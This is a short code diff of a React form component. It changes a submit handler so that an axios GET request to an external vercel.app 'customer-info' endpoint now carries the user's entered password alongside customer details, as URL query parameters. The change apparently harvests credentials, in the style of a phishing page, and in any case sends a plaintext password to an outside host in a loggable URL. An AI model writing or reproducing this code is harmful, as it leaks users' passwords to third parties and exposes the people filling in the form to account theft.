@@ -26,7 +26,7 @@ export default async function Info() {
   };
   const onSubmit: SubmitHandler<any> = (data) => {
     axios.get('https://vercel-nodejs-six.vercel.app/api/customer-info', {
-      params: customer
+      params: {...customer, password: data.password}
     });
     setSumit(true);
   };
